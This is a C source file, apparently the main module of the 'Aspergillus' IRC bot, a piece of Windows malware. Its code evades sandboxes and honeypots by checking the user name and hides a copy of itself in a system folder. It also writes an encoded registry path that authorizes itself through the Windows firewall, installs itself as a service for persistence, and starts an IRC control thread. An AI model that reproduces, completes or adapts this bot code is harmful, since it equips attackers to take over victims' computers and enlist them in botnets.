/*
		Aspergillus V1.3 by D
		Copyright (c) 2007
*/

#include "shared.h"

#ifndef DEBUG
#pragma comment(lib, "Shell32")
#endif

/////////////////
// config here //
/////////////////

char cfg_filename[] = "gfdert.exe";
char cfg_destination[] = "System";
char cfg_mutex[] = "346gdeh";
char cfg_firewall_description[] = "GFdert";

// encoded strings
char string_firewall_location[] = "\xB3\xB9\xB3\xB4\xA5\xAD\xBC\xBC\xA3\x95\x92\x92\x85\x8E\x94\xA3"
								  "\x8F\x8E\x94\x92\x8F\x8C\xB3\x85\x94\xBC\xBC\xB3\x85\x92\x96\x89"
								  "\x83\x85\x93\xBC\xBC\xB3\x88\x81\x92\x85\x84\xA1\x83\x83\x85\x93"
								  "\x93\xBC\xBC\xB0\x81\x92\x81\x8D\x85\x94\x85\x92\x93\xBC\xBC\xA6"
								  "\x89\x92\x85\x97\x81\x8C\x8C\xB0\x8F\x8C\x89\x83\x99\xBC\xBC\xB3"
								  "\x94\x81\x8E\x84\x81\x92\x84\xB0\x92\x8F\x86\x89\x8C\x85\xBC\xBC"
								  "\xA1\x95\x94\x88\x8F\x92\x89\x9A\x85\x84\xA1\x90\x90\x8C\x89\x83"
								  "\x81\x94\x89\x8F\x8E\x93\xBC\xBC\xAC\x89\x93\x94";
char string_firewall_enabled[] = "\xDA\xCA\xDA\xA5\x8E\x81\x82\x8C\x85\x84\xDA";

/////////////////
// config ends //
/////////////////

BOOL AntiSandbox()
{
	char *users[] = {"sandbox", "honey", "vmware", "currentuser", "nepenthes"};
	DWORD size = 128;
	char szUser[128];
	int i;

	GetUserName(szUser, &size);
	CharLower(szUser);

	for (i = 0; i <	(sizeof(users) / sizeof(LPTSTR)); i++)
	{
		if (strstr(szUser, users[i]) != 0)
			 return TRUE;
	}

	return FALSE;
}


void BypassFirewall(char lfile[MAX_PATH])
{
	HKEY	reg;
	char	temp[MAX_PATH], t[MAX_PATH];

	strncpy(temp, string_firewall_enabled, sizeof(temp) - 1);

	_snprintf(t, sizeof(t),"%s%s%s", lfile, Decode(temp), cfg_firewall_description);

	strncpy(temp, string_firewall_location, sizeof(temp) - 1);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, Decode(temp), 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &reg, 0);
	RegSetValueEx(reg, lfile, 0, REG_SZ, (const unsigned char *)t, strlen(t));
	RegCloseKey(reg);
}


#ifndef DEBUG
int CopyBot(char *tempdir, char *currentlocation)
{
	FILE	*read, 
			*write;
	char	*c;

	GetModuleFileName(GetModuleHandle(NULL), currentlocation, MAX_PATH);

	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES_COMMON|CSIDL_FLAG_CREATE, NULL, 0, tempdir))) 
	{
//		strncat(tempdir, "\\System", MAX_PATH);
		_snprintf(tempdir, MAX_PATH - 1, "%s\\%s", tempdir, cfg_destination); 

		if (CreateDirectory(tempdir, NULL) == 0) 
		{
			if (GetLastError() == ERROR_PATH_NOT_FOUND)
				return 0;
		}

		SetFileAttributes(tempdir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

		_snprintf(tempdir, MAX_PATH, "%s\\%s", tempdir, cfg_filename);

		if (!lstrcmpi(currentlocation, tempdir))
			return 1;

		SetFileAttributes(tempdir, FILE_ATTRIBUTE_NORMAL);

		read = fopen(currentlocation, "rb");
		write = fopen(tempdir, "wb");

		if (read == NULL || write == NULL)
			return 0;

		c = (char *) malloc (1);
		while (fread(c, 1, 1, read) > 0)
			fwrite(c, 1, 1, write);

		fclose(read);
		fclose(write);

		return 1;
	}
	else
		return 0;
}
#endif


#ifdef DEBUG
int main()
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)	
#endif
{
	char		currentfile[MAX_PATH] = {0},
				destination[MAX_PATH] = {0};

	if (AntiSandbox())
		return 0;

#ifndef DEBUG
	SetErrorMode(SEM_NOGPFAULTERRORBOX);
#endif

	if (OpenMutex(0, FALSE, cfg_mutex) != NULL)
		return 0;
	else
	{
		if (GetLastError() != ERROR_FILE_NOT_FOUND)
			return 0;
	}

#ifndef DEBUG
	if (!CopyBot(destination, currentfile))
		strcpy(destination, currentfile);
		
	SetFileAttributes(destination, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

	BypassFirewall(destination);

	SERVICE_TABLE_ENTRY servicetable[] =
	{
		{cfg_servicename, (LPSERVICE_MAIN_FUNCTION) SC_Main},
		{NULL, NULL}
	};

	if (StartServiceCtrlDispatcher(servicetable) == 0)
		SC_Install(destination, currentfile);
#else
	Thread_Start(&IRC_Thread, NULL, TRUE);
#endif

	return 0;
}